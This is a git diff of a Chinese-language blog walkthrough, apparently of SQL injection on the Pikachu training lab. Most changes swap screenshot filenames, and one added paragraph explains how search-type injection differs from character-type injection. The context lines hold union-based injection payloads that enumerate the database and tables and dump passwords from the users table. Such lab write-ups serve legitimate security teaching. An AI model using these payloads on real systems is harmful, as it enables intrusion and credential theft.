@@ -70,11 +70,11 @@ SQL注入就是指Web应用程序对用户输入数据的合法性没有判断�
 
 ![6.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/6.png)
 
-![5CT7PD3B@G_B7R_]~11YDT9.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/5CT7PD3B%40G_B7R_%5D%7E11YDT9.png)
+![QQ图片20200305113343.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305113343.png)
 
 2.判断列数`1' order by 3#`
 
-![%VMWURQ14B{0(PTG9UY7D0J.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/%25VMWURQ14B%7B0(PTG9UY7D0J.png)
+![QQ图片20200305113549.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305113549.png)
 
 3.查看union注入返回到页面的位置`-1' union select 1,2#`
 
@@ -82,7 +82,7 @@ SQL注入就是指Web应用程序对用户输入数据的合法性没有判断�
 
 4.爆库名`-1' union select database(),2#`
 
-![DWB~PHC20E)YPPYZO{4G]{V.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/DWB%7EPHC20E)YPPYZO%7B4G%5D%7BV.png)
+![QQ图片20200305113621.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305113621.png)
 
 5.爆表名`-1' union select (select group_concat(table_name) from information_schema.tables where table_schema='pikachu'),2#`
 
@@ -98,9 +98,11 @@ SQL注入就是指Web应用程序对用户输入数据的合法性没有判断�
 
 8.爆user表中的password字段`-1' union select (select group_concat(password) from pikachu.users),2#`
 
-![OCU8XSUO3Q0]SV2LX]WYBP1.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/OCU8XSUO3Q0%5DSV2LX%5DWYBP1.png)
+![QQ图片20200305113649.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305113649.png)
 
 ### 四、搜索型注入
+
+>**查看Pikachu的后台源码，发现搜索型注入和字符型注入的差别在于输入参数的闭合方式，字符型为`'name'`,搜索型为`'%name%'`,不过在注入过程中发现其payload构造方式与字符型相同，因为在构造时加入`1'`闭合前面的单引号之后，引号内部的 % 也被闭合掉了，所以不会产生影响。**
 
 1.
 
